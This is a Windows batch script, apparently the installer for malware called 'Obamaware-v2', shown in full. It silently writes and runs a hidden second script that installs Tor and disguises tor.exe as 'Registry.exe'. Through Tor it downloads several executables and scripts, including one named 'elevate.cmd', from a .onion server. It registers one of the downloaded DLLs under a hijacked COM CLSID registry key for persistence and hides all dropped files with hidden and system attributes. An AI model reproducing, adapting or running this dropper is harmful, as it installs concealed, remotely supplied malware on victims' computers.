@echo off
setlocal
setlocal enabledelayedexpansion

:: ===============================
:: CONFIGURATION
:: ===============================
set "TOR_DIR=%LOCALAPPDATA%\Obamaware-v2\tor"
set "TOR_DATA=%TOR_DIR%\data"
set "TOR_DATA_UNIX=%TOR_DATA:\=/%"
set "TOR_ARCHIVE=%LOCALAPPDATA%\Obamaware-v2\tor-win32.tar.gz"
set "VENV=%LOCALAPPDATA%\Obamaware-v2"
set "INSC_BAT=%TEMP%\WzQ219076515-E3.bat"
set "INSC_VBS=%TEMP%\WzQ465653245-E5.vbs"

del "%INSC_BAT%" 2>nul
del "%INSC_VBS%" 2>nul

:: Writing each line, first with > (overwrite), then >> (append) for all following lines

echo @echo off >> "%INSC_BAT%"
echo setlocal >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
echo :: CONFIGURATION >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
echo set "TOR_DIR=%%LOCALAPPDATA%%\Obamaware-v2\tor" >> "%INSC_BAT%"
echo set "TOR_DATA=%%TOR_DIR%%\data" >> "%INSC_BAT%"
echo set "TOR_ARCHIVE=%%LOCALAPPDATA%%\Obamaware-v2\tor-win32.tar.gz" >> "%INSC_BAT%"
echo set "VENV=%%LOCALAPPDATA%%\Obamaware-v2" >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
echo :: CREATE FOLDERS >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
echo mkdir "%%TOR_DIR%%" 2^>nul >> "%INSC_BAT%"
echo mkdir "%%TOR_DATA%%" 2^>nul >> "%INSC_BAT%"
echo mkdir "%%VENV%%" 2^>nul >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
echo :: DOWNLOAD TOR EXPERT BUNDLE >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
echo echo Downloading Tor Expert Bundle... >> "%INSC_BAT%"
echo curl -L -o "%%TOR_ARCHIVE%%" https://archive.torproject.org/tor-package-archive/torbrowser/14.5.8/tor-expert-bundle-windows-x86_64-14.5.8.tar.gz >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
echo :: EXTRACT AND CLEAN >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
echo echo Extracting Tor Expert Bundle... >> "%INSC_BAT%"
echo tar -xf "%%TOR_ARCHIVE%%" -C "%%TOR_DIR%%" ^>nul ^|^| powershell -Command "tar -xf '%%TOR_ARCHIVE%%' -C '%%TOR_DIR%%'" >> "%INSC_BAT%"
echo echo [+] Succesfully Extracted Tor Bundle >> "%INSC_BAT%"
echo del "%%TOR_ARCHIVE%%" ^>nul 2^>^&1 >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
echo :: WRITE torrc CONFIG >> "%INSC_BAT%"
echo :: =============================== >> "%INSC_BAT%"
echo ( >> "%INSC_BAT%"
echo     echo SocksPort 9050 >> "%INSC_BAT%"
echo     echo ControlPort 0 >> "%INSC_BAT%"
echo     echo DataDirectory %TOR_DATA_UNIX%/>> "%INSC_BAT%"
echo     echo Log notice file NUL >> "%INSC_BAT%"
echo ) ^> "%%TOR_DIR%%\tor\torrc" >> "%INSC_BAT%"
echo echo [+] torrc Succesfully Written >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo ren "%%LOCALAPPDATA%%\Obamaware-v2\tor\tor\tor.exe" "Registry.exe" >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo echo Tor installed to: %%TOR_DIR%% >> "%INSC_BAT%"
echo start "" /B "%%LOCALAPPDATA%%\Obamaware-v2\tor\tor\Registry.exe" >> "%INSC_BAT%"
echo timeout /t 10 /nobreak ^>nul >> "%INSC_BAT%"
echo curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/mapper_args" -o "%%VENV%%\dependencymanager.dll" >> "%INSC_BAT%"
echo curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/directmanipulation_proxy" -o "%%VENV%%\directmanipulation.dll" >> "%INSC_BAT%"
echo curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/load_mapper" -o "%%VENV%%\winexpress.exe" >> "%INSC_BAT%"
echo curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/win_start" -o "%%VENV%%\win_start.cmd" >> "%INSC_BAT%"
echo curl --socks5-hostname 127.0.0.1:9050 "http://we3ambkghnmqyecobzpea7tkpvg7fwkcxhngyesppt2thwnc33zvgnyd.onion/elevate" -o "%%VENV%%\elevate.cmd" >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo powershell -Command "New-Item -Path 'HKCU:\Software\Classes\CLSID\{54E211B6-3650-4F75-8334-FA359598E1C5}\InprocServer32' -Force | Out-Null" >> "%INSC_BAT%"
echo powershell -Command "Set-ItemProperty -Path 'HKCU:\Software\Classes\CLSID\{54E211B6-3650-4F75-8334-FA359598E1C5}\InprocServer32' -Name '(default)' -Value \"$env:LOCALAPPDATA\Obamaware-v2\directmanipulation.dll\"" >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo. >> "%INSC_BAT%"
echo timeout /t 5 /nobreak ^>nul >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%" >> "%INSC_BAT%"
echo attrib +h +s "%%TOR_DIR%%" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\directmanipulation.dll" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\dependencymanager.dll" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\winexpress.exe" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\win_start.cmd" >> "%INSC_BAT%"
echo attrib +h +s "%%VENV%%\elevate.cmd" >> "%INSC_BAT%"
echo endlocal >> "%INSC_BAT%"

:: ===============================
:: CREATE VBS SCRIPT TO RUN Installer.bat IN HIDDEN MODE
:: ===============================

echo Set WshShell = CreateObject("WScript.Shell") > "%INSC_VBS%"
echo WshShell.Run "%INSC_BAT%", 0 >> "%INSC_VBS%"
echo Set WshShell = Nothing >> "%INSC_VBS%"
:: ===============================
:: RUN THE VBS SCRIPT TO LAUNCH Installer.bat HIDDEN
:: ===============================

wscript "%INSC_VBS%"
endlocal